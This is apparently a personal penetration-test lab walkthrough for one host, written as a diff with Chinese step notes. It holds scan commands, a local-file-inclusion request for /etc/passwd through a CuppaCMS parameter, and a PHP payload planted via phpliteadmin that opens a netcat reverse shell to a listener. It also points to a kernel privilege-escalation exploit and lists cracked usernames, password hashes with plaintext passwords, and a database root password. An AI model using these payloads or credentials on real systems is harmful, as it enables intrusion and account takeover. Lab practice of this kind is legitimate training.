@@ -1,0 +1,40 @@
+nmap -sV -sC -Pn 10.11.1.116 > nmap.txt
+
+gobuster dir  -u http://10.11.1.116/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi  > gobuster.txt
+
+1.nmap掃發現80端口,並用gobuster掃描
+2.嘗試phpliteadmin無法執行phpcode,查看cuppcms有LFI漏洞
+3.在phpliteadmin創建數據庫及表,默認內容改為以下,可以取得shell
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.134 4444 >/tmp/f"); ?>
+4.根據內核漏洞查找到45010.c腳本
+也可以使用linux-suggester建議的第一項
+
+python -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+ctrl+z
+stty raw -echo && fg
+enter
+stty rows 54 && stty columns 235 && export TERM=xterm
+export TERM=xterm
+
+
+http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+
+aaron	        5978a63b4654c73c60fa24f836386d87:italia99
+accasia	        a1420fc5ab116437368889400c4bb8e1:vipsu
+bethanyjoy02	6c0f3fde58158e4c1f4cedb29c7ef4c1:WindRunner
+deanna	        f463f63616cb3f1e81ce46b39f882fd5:marianna
+jpotter	        9b38e2b1e8b12f426b0d208a7ab6cb98:7669707375
+
+
+Administrator
+admin@thinc.local
+admin
+21232f297a57a5a743894a0e4a801fc3
+
+
+databases
+cuppa
+root
+99bbVDdorGzfZJun
